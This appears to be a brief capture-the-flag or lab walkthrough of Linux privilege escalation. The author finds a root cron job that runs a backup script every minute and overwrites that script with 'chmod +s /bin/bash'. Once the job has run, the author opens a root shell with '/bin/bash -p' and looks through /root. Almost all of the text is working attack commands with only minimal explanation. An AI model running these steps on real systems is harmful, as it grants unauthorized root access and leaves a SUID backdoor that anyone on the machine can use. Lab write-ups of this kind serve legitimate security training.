```bash
cat script.sh
```
==Result:==
#!/bin/bash
`#I have set a cronjob to run this script every minute
dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
`#Back ups the site locally
`$main_site
`$dev_site

==Check permissions==
```bash
ls -lah /usr/local/sbin/dev_backup.sh
ls -lah /usr/local/bin/main_backup.sh
```
==Check user rights==
```bash
id
```
==Inject code in the script==
```bash
cat /usr/local/sbin/dev_backup.sh
echo '#!/bin/bash' > /usr/local/bin/main_backup.sh
cat /usr/local/sbin/dev_backup.sh
echo 'chmod +s /bin/bash' > /usr/local/bin/main_backup.sh
ls -lah /bin/bash
```

==Wait for cronjob to run==
```bash
ls -lah /bin/bash
```
==Run shell as root==
```bash
/bin/bash -p
whoami
cd /root
ls -lah
```